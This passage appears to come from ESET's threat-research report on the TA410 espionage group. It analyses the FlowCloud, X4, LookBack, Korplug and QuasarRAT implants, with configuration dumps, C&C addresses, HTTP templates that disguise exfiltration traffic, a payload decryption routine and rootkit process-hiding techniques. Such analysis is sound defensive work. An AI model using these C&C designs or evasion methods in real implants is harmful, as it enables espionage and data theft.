+<td class="crayon-code">POST /messagebroker/amf HTTP/1.1Host: s.peheavens.comConnection: keep-aliveContent-Length: &lt;content_length&gt;Origin: http://s.peheavens.comX-Requested-With: ShockwaveFlash/20.0.0.306User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36Content-Type: application/x-amfAccept: */*Referer: http://s.peheavens.com/html/portlet/ext/draco/resources/draco_manager.swf/[[DYNAMIC]]/1Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: COOKIE_SUPPORT=true; JSESSIONID=5C7E7A60D01D2891F40648DAB6CB3DF4.jvm1; COMPANY_ID=10301; ID=666e7375545678695645673d; PASSWORD=7a4b48574d746470447a303d; LOGIN=6863303130; SCREEN_NAME=4a2b455377766b657451493d; GUEST_LANGUAGE_ID=en-US</td>
+</tr>
+</tbody></table>
+<p>Figure 11. Hardcoded, fake HTTP POST request used for FlowCloud C&amp;C communication</p>
+<p>This component uses an encrypted, Protobuf-serialized configuration that it tries to read from a file on disk or a registry key. The configurations we observed were composed of three sections:</p>
+<ol>
+<li>server_config: This section contains information about the C&amp;C servers and identification information about the victim and backdoor.</li>
+<li>policys [sic]: This section defines the behavior of the backdoor’s components and is described in detail in the following paragraphs.</li>
+<li>install_config: As the name indicates, this section defines the installation parameters.</li>
+</ol>
+<p>An example of such a server_config is shown in Figure 12. This configuration corresponds to resource 1000 in the initial loader. It defines the address and port for both the exfiltration server (file_server) and the C&amp;C server (exchange_server), along with the encryption key to use for communication with each. A fallback server can also be defined for each of these. The file_key field defines the encryption key to use when storing files that are to be exfiltrated. The other entries are used to identify the backdoor and the victimized host:</p>
+<ul>
+<li>product_name: A name for the backdoor in use. PCArrowI seems to correspond to FlowCloud.</li>
+<li>product_version: The backdoor’s version.</li>
+<li>id_prefix: This value is prefixed to the generated ID. Presumably, used to group victims or campaigns.</li>
+<li>id: This value uniquely identifies the victim. Initially, it is empty; the value is generated on the first execution using the following format: &lt;prefix&gt;_&lt;current timestamp&gt;_&lt;machine hostname&gt;</li>
+</ul>
+<p></p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+12345678910111213141516171819202122
+</td>
+<td class="crayon-code">server_config { product_name: “PCArrowI" product_version: "v5.0.2" id: "1202_[REDACTED]" root: "" file_server: "47.111.22[.]65" file_server_port: "80" file_server_bak: "" file_server_bak_port: "" exchange_server: "47.111.22[.]65" exchange_server_port: "81" exchange_server_bak: "" exchange_server_bak_port: "" file_server_key: "E\367\016\031&lt;…&gt;" xchg_server_key: "8\335\325$&lt;…&gt;" file_key: "U\267\323\353\&lt;…&gt;" is_audio_only: false id_prefix: "1202"} </td>
+</tr>
+</tbody></table>
+<p>Figure 12. server_config section of a decoded FlowCloud configuration</p>
+<p>FlowCloud’s capabilities are spread out over a series of singleton classes, each of which implements a cohesive set of functionalities related to a specific type of data or action. These roughly follow an internal naming convention where classes with names ending with manager_handler perform actions in response to C&amp;C commands, while those whose names end with manager automatically perform actions based on timers or event listeners.</p>
+<p>Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&amp;C server. Data is encrypted with the aforementioned file_key before being inserted into the database. The location of the SQLite databases is defined by the data_folder install configuration key, with the default value being %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\fcdata.</p>
+<p>The classes are orchestrated by an instance of fc_kernel_manager. This object is responsible for initializing other components and handling C&amp;C connections. It can also update the local configuration when the corresponding command is received.</p>
+<p>As shown in Figure 13, parameters and frequency of automated actions can be specified and finely tuned through configuration policies. Data exfiltration is likewise automated: policies can contain a cache_size or cache_count parameter, which determines how much data can be collected locally by the corresponding class before it is staged for exfiltration.</p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657
+</td>
+<td class="crayon-code">policys { keyboard_policy { state: true cycle_time: 60 limit_size: 100 cache_size: 10 } screen_policy { state: true cycle_time: 30 cache_count: 200 bit_depth: 4 } audio_policy { state: false cache_size: 100 decibel_limit: 65 continue_seconds: 15 } smfile_search_policy { guid: "XXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX" state: false research: true inc_all_removable: true inc_all_fixed: true limit_size: 1 recent_days: 30 filter: "*.doc" filter: "*.docx" filter: "*.xls" filter: "*.xlsx" filter: "*.ppt" filter: "*.pptx" filter: "*.bmp" filter: "*.jpg" filter: "*.png" filter: "*.gif" cache_size: 1024 b_exclude_system_files: true b_exclude_system_folders: true } installedapp_policy { state: false } clipboard_policy { state: false ignore_repeat: true cycle_time: 300 limit_size: 100 single_limit_size: 10 cache_size: 50 } user_activity_policy { process_activity_state: false browser_activity_state: false } }</td>
+</tr>
+</tbody></table>
+<p>Figure 13. The policys [sic] section of a decoded FlowCloud config</p>
+<p>As we have previously mentioned, this implant uses a lot of classes. Rather than documenting each of them individually, we will present an overview of the available functionality by grouping them into three categories: those that interact with the file system, functionalities that collect information about programs and processes, and those that gather real-time information about user activity.</p>
+<h4>File system</h4>
+<p>FlowCloud provides interaction with the file system in a variety of ways, most of which can store file metadata and content in their SQLite database.</p>
+<p>One of these is a component that walks through all mapped file systems and collects files that are not excluded by filters in the smfile_search_policy. It also creates an invisible window that listens for file creation, modification, or renaming events. The corresponding files are collected unless they are excluded by that policy.</p>
+<p>Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data. This same class collects file and directory metadata.</p>
+<p>As a complement to these automated measures, the backdoor implements functions that provide full access and control over the content of mounted drives. This includes bidirectional file transfers between the C&amp;C and the compromised machine.</p>
+<h4>Programs and processes</h4>
+<p>FlowCloud is able to automatically obtain a list of installed software through the use of the undocumented IShellAppManager COM interface. This functionality can also be invoked via a C&amp;C command. Figure 14 shows, after the extraneous code has been removed, how that interface is used.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Simplified-code-showing-how-the-IShellAppManager-COM-interface-is-used-to-list-installed-applications.png"><img alt="" class="wp-image-161830" height="296" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-14.-Simplified-code-showing-how-the-IShellAppManager-COM-interface-is-used-to-list-installed-applications-300x99.png" style="max-width:800px;height:auto;width:auto;" width="900"/></a><p>Figure 14. Simplified code showing how the IShellAppManager COM interface is used to list installed applications</p>
+<p>Other commands can be used to retrieve a detailed list of available services and currently running processes.</p>
+<p>Another interesting feature is the near real-time monitoring of process activity. To achieve this, FlowCloud runs WMI queries every second to get all process creation and termination events. The obtained information is correlated with data from the Win32_Process table for a more detailed view.</p>
+<h4>User activity</h4>
+<p>FlowCloud is able collect a miscellany of data that we have decided to group under the “User activity” umbrella.</p>
+<p>It has the ability to monitor the clipboard for changes and save any data it contains. As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats. This window uses AddClipboardFormatListener (on Windows Vista or more recent) or SetClipboardViewer (on Windows XP and prior) to listen for clipboard content changes.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Set-up-monitoring-of-the-clipboard.png"><img alt="" class="wp-image-161831" height="419" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-15.-Set-up-monitoring-of-the-clipboard.png" style="max-width:800px;height:auto;width:auto;" width="799"/></a><p>Figure 15. Set up monitoring of the clipboard</p>
+<p>Collected clipboard content is stored along with information about the current foreground window. This information can help attackers understand the data by contextualizing it.</p>
+<p>FlowCloud can periodically take screenshots and store them with information about the foreground process and time since the last user input. To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved. This feature can also be invoked on demand by the server.</p>
+<p>Another of the backdoor’s components records mouse and keyboard activity to a database. It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the \\.\pipe\namedpipe_keymousespy_english named pipe.</p>
+<p>Interestingly, FlowCloud can also gather information about things happening around the victim’s computer. The first way it does so is through a C&amp;C command that takes a picture using connected camera peripherals. This feature is implemented using the CCameraDS class from OpenCV.</p>
+<p>The second way it can collect information about the computer’s surroundings is by recording audio. Much like a voice assistant, FlowCloud can use a computer’s microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit field of the audio_policy. The default value is 65 decibels, which is in the upper range of normal conversation volume (<a href="https://www.earq.com/hearing-health/decibels" rel="noopener" target="_blank">commonly defined</a> to be anywhere between 50 and 70 dB by various sources).</p>
+<h4>Self-decrypting DLL (setlangloc.dat)</h4>
+<p>The loaded shellcode is a self-decrypting DLL. It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16). The shellcode we analyzed used the key 0x7B. Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded module’s startModule export.</p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+12
+</td>
+<td class="crayon-code">for (int i=0; i &lt; ciphertext_length; i++) plaintext[i] = ((encrypted[i] ^ key) + key) &amp; 0xFF</td>
+</tr>
+</tbody></table>
+<p>Figure 16. Pseudocode for the DLL decryption routine</p>
+<p>This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above. On top of those, it also uses a few tricks of its own:</p>
+<ul>
+<li>Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.</li>
+<li>Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.</li>
+<li>Exits if the process’s executable is not the expected DLL hijacking target (e.g., setlang.exe).</li>
+</ul>
+<p>The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region. This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export. That function will perform the final stages of the installation and load the DLL containing the backdoor functionality.</p>
+<h4>Driver (hidmouse.sys)</h4>
+<p>FlowCloud’s driver serves a dual purpose: it acts as both a keylogger and a rootkit. It accomplishes this mainly by hijacking native drivers’ handler functions for specific I/O control codes and replacing them with its own:</p>
+<ul>
+<li>Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0)</li>
+<li>Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0)</li>
+<li>Device control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy)</li>
+</ul>
+<p>The driver also provides kernel-level functionalities to be used by the RAT. They can be invoked via IO control codes or by writing to specific registry keys.</p>
+<p>This module is signed with a certificate with the thumbprint 02ED6A578C575C8D9C72398E790354B095BB07BC. Issued to Hangzhou Leishite Laser Technology Co. in 2012 by Wosign and revoked in 2014, it seems most likely this certificate was stolen.</p>
+<h4>Keylogging</h4>
+<p>In its IRP_MJ_READ handlers for keyboard and mouse events, the driver simply records IO events to <a href="https://geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/lookasid/index.htm" rel="noopener" target="_blank">lookaside lists</a> before passing them to the legitimate handler. This ensures that the driver doesn’t interfere in a way that could be noticeable by the user. These events are then parsed to the format used by the backdoor’s keymouse_manager and written to the named pipe \\.\pipe\namedpipe_keymousespy_english.</p>
+<h4>Rootkit</h4>
+<p>After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.</p>
+<p>The rootkit can prevent processes from being shown by utilities that list running processes, such as Task Manager. As shown in Figure 17, it achieves this by removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure. Since this structure is not part of the public API and can change between releases, the rootkit contains code to match the operating system’s build number to the correct offsets in this structure. That code covers all versions from Windows XP to Windows 10 20H1. This functionality can be invoked on any process via the IOCTL_HIDE_PROCESS_BY_PROCESSID (0x222028) control code. It is also used, on driver startup, to hide the process with the PID contained in the registry key HKLM\HARDWARE\{76BA14B7-AF0C-4dc9-9E9D-2A6970F231D9}. This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-17.-Function-used-to-prevent-a-process-from-being-displayed-in-lists-of-running-processes.png"><img alt="" class="wp-image-161832" height="493" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-17.-Function-used-to-prevent-a-process-from-being-displayed-in-lists-of-running-processes-300x185.png" style="max-width:800px;height:auto;width:auto;" width="800"/></a><p>Figure 17. Function used to prevent a process from being displayed in lists of running processes</p>
+<p>Through its hijacking of the network driver, the rootkit can also hide a single process’s network traffic from local utilities. The process whose traffic is to be hidden is set through the IOCTL_SET_TRAFFICHIDE_PROCESSID (0x222048) control code.</p>
+<p>Some of the rootkit’s functions are used by the fcClientDll module to hide the process in which it is running.</p>
+<p>Control codes to manipulate a process name in various internal structures are also exposed by the driver.</p>
+<h4>Persistence module (fcClientWD)</h4>
+<p>This module is relatively simple compared to other components. The previously mentioned NetTask already accomplishes persistence in most cases, by executing on system startup. This module complements that mechanism by ensuring persistence in a very specific edge case where execution of the malware might be interrupted: the user logs out on a system with hibernation and Fastboot enabled. On systems where either of those is disabled, this module does nothing.</p>
+<h4>FlowCloud v4.1.3</h4>
+<p>This older version of FlowCloud has already been described in a <a href="https://www.proofpoint.com/us/blog/threat-insight/flowcloud-version-413-malware-analysis" rel="noopener" target="_blank">Proofpoint blogpost</a> and presents similarities to the newer version described in the preceding subsections, so we will only highlight notable differences and new information revealed by our analysis.</p>
+<p>This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed. It checks running processes for executables of several known cybersecurity vendors. While most of these names are also present in version 5, this list is not a strict subset of the one v.5 uses. This tends to support the proposition that versions 4 and 5 of FlowCloud are maintained in parallel.</p>
+<p>It also embeds a DLL version of the <a href="https://github.com/a0rtega/pafish" rel="noopener" target="_blank">Pafish</a> (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources. This library is loaded in memory and all of the anti-analysis/anti-sandboxing checks it implements are run.</p>
+<p>Interestingly, the driver installed is the same as the one for version 5.0.2. Those used by version 5.0.3 provide identical functionality, but differ slightly.</p>
+<h3>TA410 – LookingFrog</h3>
+<p>LookingFrog uses two main malware families: X4 and LookBack. We have seen both of them on machines belonging to the same victim.</p>
+<h4>X4</h4>
+<p>X4 is a custom backdoor that is used as a first stage, before LookBack is deployed. It is loaded by a VMProtect-ed loader, usually named PortableDeviceApi.dll or WptsExtensions.dll. Unfortunately, we were not able to uncover any persistence method.</p>
+<p>The loader injects an orchestrator into memory in a svchost.exe process. In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\rsa.txt. Figure 18 shows a summary of the X4 components.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-Summary-of-the-X4-components.png"><img alt="" class="wp-image-161833" height="424" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-18.-Summary-of-the-X4-components-300x159.png" style="max-width:800px;height:auto;width:auto;" width="800"/></a><p>Figure 18. Summary of the X4 components</p>
+<p>The network component is shellcode. It is encrypted using the AES algorithm and stored in the Windows registry. Table 2 shows the three registry keys used by X4.</p>
+<p>Table 2. Network shellcode registry keys</p>
+<table class="tablepress tablepress-id-1122" id="tablepress-1122">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">Registry Key</th><th class="column-2">Description</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1">HKLM\SOFTWARE\Microsoft\DRM\X4Key</td><td class="column-2">AES key.</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">HKLM\SOFTWARE\Microsoft\DRM\PSKey</td><td class="column-2">Name of the process into which the shellcode will be injected (spoolsv.exe).</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">HKLM\SOFTWARE\Microsoft\DRM\X4Data</td><td class="column-2">Encrypted shellcode.</td>
+</tr>
+</tbody>
+</table>
+<p>The decrypted shellcode looks like it was based on Metasploit and communicates with a hardcoded IP address via HTTP. An interesting characteristic is that it uses the fake Host header onedrive.live.com.</p>
+<p>Every second, the orchestrator, which lives in memory only, reads the cleartext rsa.txt file to check whether there are new commands to execute. The commands are received from the C&amp;C server, via the network shellcode. In the orchestrator, the commands are identified by a numerical identifier that is computed from the command name, as shown in Figure 19.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-19.-Custom-hash-function-seen-in-X4.png"><img alt="" class="wp-image-161834 size-full" height="125" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-19.-Custom-hash-function-seen-in-X4.png" width="626"/></a><p>Figure 19. Custom hash function seen in X4</p>
+<p>The orchestrator handles seven commands, detailed in Table 3. Output of these commands is written to C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\output.log.</p>
+<p>Table 3. X4 backdoor commands</p>
+<table class="tablepress tablepress-id-1123" id="tablepress-1123">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">ID</th><th class="column-2">Name</th><th class="column-3">Description</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1">0x3ECFF9B9D92</td><td class="column-2">osload</td><td class="column-3">Write new encrypted shellcode to HKLM\SOFTWARE\Microsoft\DRM\X4Data. It can also modify X4Key and PSKey.</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">0x3F5FAFC0EDD</td><td class="column-2">pskill</td><td class="column-3">Kill a process by PID.</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">0x3F5FB1E6015</td><td class="column-2">pslist</td><td class="column-3">List the running processes using CreateToolhelp32Snapshot and Process32Next.</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">0x3B6C27610D1</td><td class="column-2">inject</td><td class="column-3">Decrypt and inject shellcode, from encrypted form on disk, into memory.</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">0xDA83E71</td><td class="column-2">exec</td><td class="column-3">Execute a given command line.</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">0xE9478DC</td><td class="column-2">live</td><td class="column-3">Get the PID of the process in which the orchestrator is running.</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">0x6D6E70D40</td><td class="column-2">cacls</td><td class="column-3">Modify the access controls of a given object using SetEntriesInAclA, SetNamedSecurityInfoA and BuildExplicitAccessWithName.</td>
+</tr>
+</tbody>
+</table>
+<p>X4 provides basic functionalities to control the machine remotely, but it lacks more advanced spying capabilities.</p>
+<h3>LookBack</h3>
+<p>The LookBack backdoor has previously been described by <a href="https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks">Proofpoint</a>; we are therefore providing a quick summary and our analysis of the custom network protocol.</p>
+<h4>Backdoor</h4>
+<p>In all samples we observed, the LookBack loader is a legitimate version of libcurl.dll with the curl_share_init (ordinal #52) export modified to load the SodomNormal communications module. This corroborates the observation by <a href="https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks">Proofpoint</a> researchers. This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4. The encryption/decryption function, shown in Figure 20, always uses the same key.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-20.-Decompiled-view-of-the-function-used-to-encrypt-and-decrypt-the-embedded-module.png"><img alt="" class="wp-image-161835" height="619" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-20.-Decompiled-view-of-the-function-used-to-encrypt-and-decrypt-the-embedded-module-300x232.png" style="max-width:800px;height:auto;width:auto;" width="800"/></a><p>Figure 20. Decompiled view of the function used to encrypt and decrypt the embedded module</p>
+<p>The SodomNormal component tries to read configuration information from a sodom.ini file. This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC. If this file is unavailable or invalid, a hardcoded default configuration is used.</p>
+<p>A unique victim ID is then generated from the victim’s CPUID, username, and IP address. This is sent to the server along with the computer’s name and the configuration data. The communications module then downloads the main backdoor module, named SodomMain, from the C&amp;C server. Unfortunately, we couldn’t obtain this module.</p>
+<h4>Communication protocol</h4>
+<p>LookBack can communicate over HTTP or via its “normal protocol”. In either case, the data being transferred is the same.</p>
+<p>LookBack’s normal protocol uses raw TCP sockets and a custom message format described in Table 4. This message is composed of eight header fields, followed by a body of variable length. The message body is encrypted with the function previously described for the SodomNormal resource in the loader (Figure 20). The encrypted data is then compressed with the deflate algorithm via the compress function of the statically linked zlib.</p>
+<p>Table 4. LookBack message format</p>
+<table class="tablepress tablepress-id-1124" id="tablepress-1124">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">Field</th><th class="column-2">Offset (bytes)</th><th class="column-3">Note</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1">Magic bytes</td><td class="column-2">0x00</td><td class="column-3">The constant 0x48AB2EC2. Messages that don’t start with this magic value are discarded.</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">&lt;Message dependent&gt;</td><td class="column-2">0x04</td><td class="column-3"></td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">Compressed body size</td><td class="column-2">0x08</td><td class="column-3"></td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">Uncompressed body size</td><td class="column-2">0x0C</td><td class="column-3"></td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">Checksum</td><td class="column-2">0x10</td><td class="column-3">CRC32 of the message body.</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">Message type</td><td class="column-2">0x14</td><td class="column-3">Integer value indicating the message’s content and the associated action to be performed.
+We have found code for over 50 message types. There seems to be little to no overlap between the values used by the client and the server. Table 5 presents the types we have analyzed in more depth.</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">&lt;Message dependent&gt;</td><td class="column-2">0x18</td><td class="column-3"></td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">&lt;Message dependent&gt;</td><td class="column-2">0x1C</td><td class="column-3"></td>
+</tr>
+<tr class="row-10 even">
+<td class="column-1">Message Body</td><td class="column-2">0x20</td><td class="column-3">The message body can be empty. In this case, the checksum and length fields are set to 0x00.</td>
+</tr>
+</tbody>
+</table>
+<p>Table 5. LookBack message types</p>
+<table class="tablepress tablepress-id-1125" id="tablepress-1125">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">Message type</th><th class="column-2">Used by</th><th class="column-3">Description</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1">2</td><td class="column-2">Client</td><td class="column-3">Register with C&amp;C server. The body contains configuration and information about the victim host.</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">3</td><td class="column-2">Server</td><td class="column-3">Acknowledgment for message type 2.</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">8</td><td class="column-2">Client</td><td class="column-3">Request to download the main backdoor component (SodomMain).</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">9</td><td class="column-2">Server</td><td class="column-3">Reply to message type 8. The message body contains the SodomMain file.</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">36 and 38</td><td class="column-2">Client</td><td class="column-3">Transfer file to server in message body.</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">35 and 37</td><td class="column-2">Server</td><td class="column-3">Response to message 36 or 38.</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">41</td><td class="column-2">Client</td><td class="column-3">Request file from server.</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">42</td><td class="column-2">Server</td><td class="column-3">Transfer file to client in message body (response to message 41)</td>
+</tr>
+</tbody>
+</table>
+<p>The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP. It uses a pair of hardcoded templates, one for client requests and another for server responses. The fields required for HTTP, such as content length, address, and port number, are filled in with the correct values; useless data is used for the others.</p>
+<p>For client requests, the messages are encoded with a modified hexadecimal algorithm that uses the encoding alphabet a-p instead of the conventional 0-9a-f. This provides some obfuscation and ensures that messages will not contain binary data or be obviously hex encoded, both of which could look suspicious in an application/x-www-form-urlencoded message. The request’s body is composed of this encoded value prefixed with the hardcoded string id=1&amp;op=report&amp;status=. Client request and server response templates are shown in Figure 21 and Figure 22 respectively, with the template fields in angle brackets.</p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+123456789101112
+</td>
+<td class="crayon-code">POST &lt;C&amp;C address + port&gt;/status.php?r=&lt;epoch timestamp&gt;&lt;random 16-bit int&gt; HTTP/1.1Accept: text/html, application/xhtml+xml, */*Accept-Language: en-usUser-Agent: &lt;return value of ObtainUserAgentString OR "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"&gt;Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: &lt;C&amp;C url&gt;Content-Length: &lt;content length&gt;Connection: Keep-AliveCache-Control: no-cache id=1&amp;op=report&amp;status=&lt;encoded LookBack message&gt;</td>
+</tr>
+</tbody></table>
+<p>Figure 21. Template used for HTTP client requests</p>
+<p>On the server side, the data described in the previous section is sent directly as binary data in the body with a header purporting it is a GIF image.</p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+123456789101112
+</td>
+<td class="crayon-code">HTTP/1.1 200 OKServer: nginx/1.12.2Date: &lt;current time&gt; GMTLast-Modified: &lt;current time - 100 seconds&gt; GMTETag: &lt;3 random 16-bit ints&gt;Accept-Ranges: bytesContent-Length: &lt;content length&gt;Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: image/gif &lt;LookBack message&gt;</td>
+</tr>
+</tbody></table>
+<p>Figure 22. Template used for HTTP server responses</p>
+<h3>TA410 – JollyFrog</h3>
+<p>This third team uses off-the-shelf malware from the known malware families QuasarRAT and Korplug (aka PlugX). JollyFrog mostly aligns with what was described <a href="https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-">by Fortinet as APT10</a>.</p>
+<h4>Korplug</h4>
+<p>Korplug, also known as <a href="https://attack.mitre.org/software/S0013/">PlugX</a>, is a backdoor that has been used for years by many different cyberespionage groups. Despite being well known, it is still in use and we have observed TA410 using it as recently as in April 2021.</p>
+<p>In the case of TA410, Korplug arrives as a RARSFX archive, generally named m.exe, containing three files:</p>
+<ul>
+<li>qrt.dll: A custom loader.</li>
+<li>qrtfix.exe: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking.</li>
+<li>qrt.dll.usb: The Korplug shellcode.</li>
+</ul>
+<p>The loader allocates memory using VirtualAlloc and copies the content of qrt.dll.usb there. Then it jumps right into the shellcode that will decompress and load the Korplug payload.</p>
+<h4>QuasarRAT</h4>
+<p>QuasarRAT is a full-featured backdoor freely available on <a href="https://github.com/quasar/Quasar" rel="noopener" target="_blank">GitHub</a>. It is used by numerous threat actors who perform cyberespionage or cybercrime.</p>
+<p>TA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers.</p>
+<p>Named sll.exe, this downloader is digitally signed with the certificate seen in Figure 23. The certificate is likely stolen and belongs to 北京和赢讯时科技有限公司 (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252. Although the certificate has now been revoked, it was still valid when this sample was signed on August 10th, 2020.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-23.-Digital-signature-of-the-QuasarRAT-downloader.png"><img alt="" class="wp-image-161836" height="581" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-23.-Digital-signature-of-the-QuasarRAT-downloader.png" width="500"/></a><p>Figure 23. Digital signature of the QuasarRAT downloader</p>
+<p>This downloader simply downloads the loader and encrypted QuasarRAT payload from the hardcoded C&amp;C server http://ffca.caibi379[.]com, at /rwjh/new/. This server was previously <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" rel="noopener" target="_blank">linked to FlowCloud</a> (FlowingFrog). The loader is named PresentationCache.exe and is protected with <a href="http://www.dnguard.net" rel="noopener" target="_blank">DNGuard</a>, a commercial .NET packer. It is also signed with the same certificate as the downloader. It decrypts and loads the final QuasarRAT payload, which uses cahe.microsofts[.]org as its C&amp;C server.</p>
+<h2>Conclusion</h2>
+<p>TA410 is a cyberespionage umbrella targeting high-profile entities such as governments and universities worldwide. ESET is revealing its latest findings about this group, including results from ongoing research, during <a href="https://www.botconf.eu/" rel="noopener" target="_blank">Botconf 2022</a>.</p>
+<p>Initial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange, or by sending spearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder. Even though the JollyFrog team uses generic tools, FlowingFrog and LookingFrog have access to complex implants such as FlowCloud and LookBack. YARA and Snort rules for these implants are available <a href="https://github.com/eset/malware-ioc" rel="noopener" target="_blank">in ESET’s GitHub repository</a>.</p>
+<p></p>For any inquiries about our research published on WeLiveSecurity, please contact us at <a href="mailto:threatintel@eset.com">threatintel@eset.com</a>.<p></p>
+<p>ESET Research now also offers private APT intelligence reports and data feeds. For any inquiries about this service, visit the <a href="https://www.eset.com/int/business/services/threat-intelligence/" rel="noopener" target="_blank">ESET Threat Intelligence</a> page.</p><p></p>
+<h2>IoCs</h2>
+<h3>Files</h3>
+<table class="tablepress tablepress-id-1127" id="tablepress-1127">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">SHA-1</th><th class="column-2">Filename</th><th class="column-3">Detection</th><th class="column-4">Description</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
